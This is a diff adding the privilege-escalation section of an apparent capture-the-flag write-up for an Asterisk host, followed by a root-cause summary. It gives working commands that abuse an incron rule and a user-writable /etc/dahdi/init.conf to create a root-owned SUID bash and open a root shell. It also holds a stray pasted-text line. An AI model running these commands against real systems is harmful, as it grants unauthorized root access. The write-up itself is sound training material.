@@ -190,3 +190,202 @@ returned:
 This can be used to improve the interactive shell before beginning privilege-escalation enumeration.
 
 The next stage is to enumerate the `asterisk` account and identify a path to root.
+
+### Privilege Escalation
+
+With a shell as the `asterisk` user, I started enumerating possible privilege-escalation paths.
+
+```
+sudo -l
+```
+
+`sudo` required the `asterisk` user's password, so this was not immediately useful.
+
+I then checked for SUID binaries:
+
+```
+find / -perm -4000 -type f 2>/dev/null
+```
+
+Nothing immediately stood out as an obvious path to root. I also checked Linux capabilities, but there was no directly exploitable capability assigned to the `asterisk` user.
+
+#### Incron
+
+While enumerating scheduled tasks, I noticed that the machine was using **incron**, an inotify-based alternative to cron.
+
+```
+ls -la /etc/incron.d/
+```
+
+The configuration contained several interesting entries:
+
+```
+/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
+```
+
+This was interesting because the watched `/var/spool/asterisk/sysadmin` directory was accessible to the `asterisk` user.
+
+I inspected the helper:
+
+```
+cat /usr/sbin/sysadmin_dahdi_restart
+```
+
+It contained:
+
+```
+#!/bin/sh
+
+/etc/init.d/asterisk stop
+
+sleep 5
+
+/etc/init.d/dahdi restart
+
+sleep 5
+
+export PATH=$PATH:/usr/local/sbin/:/usr/local/bin/
+`which amportal` start
+```
+
+The important part was:
+
+```
+/etc/init.d/dahdi restart
+```
+
+Since `dahdi` was restarted by a root-owned script, I inspected its initialization script.
+
+#### DAHDI Initialization
+
+```
+cat /etc/init.d/dahdi
+```
+
+Among other things, it contained:
+
+```
+[ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
+```
+
+The `.` command sources the contents of `init.conf` into the current shell.
+
+I then checked its permissions:
+
+```
+ls -la /etc/dahdi/init.conf
+```
+
+The file was writable by `asterisk`:
+
+```
+-rw-r--r--. 1 asterisk asterisk ... /etc/dahdi/init.conf
+```
+
+This gave me the complete privilege-escalation chain:
+
+```
+asterisk
+   |
+   v
+write to /var/spool/asterisk/sysadmin/dahdi_restart
+   |
+   v
+incron detects IN_CLOSE_WRITE
+   |
+   v
+/usr/sbin/sysadmin_dahdi_restart
+   |
+   v
+/etc/init.d/dahdi restart
+   |
+   v
+/etc/dahdi/init.conf is sourced
+   |
+   v
+attacker-controlled commands execute as root
+```
+
+The uploaded writeup confirms this exact chain and the writable `init.conf` primitive. Pasted text
+
+#### Obtaining Root
+
+Instead of using a reverse shell, I used the sourced configuration file to create a SUID copy of `/bin/bash`.
+
+First, I made sure the previous reverse-shell payload was removed from `init.conf`. This was important because the earlier reverse-shell attempt could interfere with execution of subsequent commands.
+
+Then I appended:
+
+```
+printf '\ninstall -m 4755 /bin/bash /home/asterisk/pwn1\n' >> /etc/dahdi/init.conf
+```
+
+I triggered the incron rule by writing to the watched file:
+
+```
+echo restart > /var/spool/asterisk/sysadmin/dahdi_restart
+```
+
+After waiting approximately 20–25 seconds, I checked whether the SUID binary had been created:
+
+```
+ls -la /home/asterisk/pwn1
+```
+
+The resulting file was owned by root and had the SUID bit set:
+
+```
+-rwsr-xr-x 1 root root ... /home/asterisk/pwn1
+```
+
+I could then execute it with Bash's `-p` option:
+
+```
+/home/asterisk/pwn1 -p
+```
+
+Finally:
+
+```
+id
+```
+
+returned:
+
+```
+uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk) euid=0(root)
+```
+
+The effective UID was `0`, giving me a root shell.
+
+I verified root access:
+
+```
+cat /root/root.txt
+```
+
+And retrieved the root flag.
+
+#### Root Cause
+
+The privilege escalation was possible because a root-executed DAHDI initialization script sourced a configuration file that was writable by the low-privileged `asterisk` user.
+
+The vulnerable trust chain was:
+
+```
+Writable configuration
+        ↓
+/etc/dahdi/init.conf
+        ↓
+sourced by root
+        ↓
+/etc/init.d/dahdi
+        ↓
+triggered through sysadmin_dahdi_restart
+        ↓
+triggered by incron
+        ↓
+asterisk-controlled file write
+        ↓
+root command execution
+```
